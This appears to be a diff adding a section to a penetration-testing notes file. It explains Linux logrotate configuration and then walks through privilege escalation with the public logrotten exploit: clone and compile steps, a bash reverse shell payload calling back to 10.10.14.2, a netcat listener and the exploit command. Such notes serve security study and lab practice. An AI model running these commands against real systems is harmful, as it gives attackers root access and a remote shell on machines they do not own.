@@ -1731,4 +1731,108 @@ kubectl --token=$TOKEN --certificate-authority=ca.crt --server=https://<API_SERV
 
 ---
 
+# 🌀 Logrotate Overview and Exploitation Notes
 
+## 📘 What is Logrotate?
+Logrotate is a Linux utility designed to manage log files by:
+- Archiving or deleting old logs
+- Preventing disk overflow
+- Improving log search efficiency
+
+Log files in `/var/log` help administrators diagnose system issues and monitor service health.
+
+## ⚙️ Key Features
+Logrotate allows configuration based on:
+- **Size** of log files
+- **Age** of log files
+- **Actions** to take (e.g., compress, delete, rename)
+
+## 📄 Usage
+```bash
+$ man logrotate
+$ logrotate --help
+```
+
+### Common Options
+- `-d` Debug mode (no changes made)
+- `-f` Force rotation
+- `-v` Verbose output
+- `-s` Specify state file
+- `-l` Log to file or syslog
+
+## 🛠 Configuration
+Main config file: `/etc/logrotate.conf`
+
+### Example:
+```conf
+weekly
+su root adm
+rotate 4
+create
+#include /etc/logrotate.d
+```
+
+### Status File:
+Tracks last rotation date:
+```bash
+$ sudo cat /var/lib/logrotate.status
+/var/log/samba/log.smbd" 2022-8-3
+/var/log/mysql/mysql.log" 2022-8-3
+```
+
+### Per-Service Configs:
+Stored in `/etc/logrotate.d/`
+
+Example: `/etc/logrotate.d/dpkg`
+```conf
+/var/log/dpkg.log {
+    monthly
+    rotate 12
+    compress
+    delaycompress
+    missingok
+    notifempty
+    create 644 root root
+}
+```
+
+## 🚨 Exploitation Requirements
+- Write access to log files
+- Logrotate must run as root
+- Vulnerable versions:
+  - 3.8.6
+  - 3.11.0
+  - 3.15.0
+  - 3.18.0
+
+## 🧨 Exploit: Logrotten
+### Setup
+```bash
+$ git clone https://github.com/whotwagner/logrotten.git
+$ cd logrotten
+$ gcc logrotten.c -o logrotten
+```
+
+### Payload
+Create a reverse shell payload:
+```bash
+$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
+```
+
+### Confirm Logrotate Behavior
+```bash
+$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
+create
+```
+
+### Start Listener
+```bash
+$ nc -nlvp 9001
+```
+
+### Run Exploit
+```bash
+$ ./logrotten -p ./payload /tmp/tmp.log
+```
+
+---
